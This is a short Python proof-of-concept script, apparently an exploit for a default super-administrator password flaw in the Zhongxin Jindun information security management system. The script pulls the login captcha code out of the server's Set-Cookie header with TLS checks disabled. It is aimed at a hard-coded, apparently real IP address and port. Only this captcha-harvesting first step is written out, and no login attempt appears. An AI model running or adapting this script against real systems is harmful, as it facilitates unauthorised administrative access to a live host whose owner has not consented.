# 中新金盾信息安全管理系统 默认超级管理员密码漏洞

import requests
import re
import sys
import base64
import time
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+-----------------------------------------')
    print('中新金盾信息安全管理系统 默认超级管理员密码漏洞poc-by小马哥')
    print('+-----------------------------------------')

def poc1(target_url):
    vuln_url = target_url +'/index.php?q=common/getcode'
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/'}
    try:
        #requests.packages.urllib3.exceptions(InsecureRequestWarning)
        r = requests.get(url=vuln_url,headers=headers,verify=False,timeout=5)
        print('[+] 正在获取验证码 {0}'.format(vuln_url))
        response_data = r.headers['Set-Cookie']
        check_code = re.findall(r'check_code=(.*?);',response_data)[0]
        print('[+] 验证码:{}'.format(check_code))

    except Exception as e:
        print('[+] 请求失败',e)


title()
poc1(target_url='http://61.175.103.155:28080')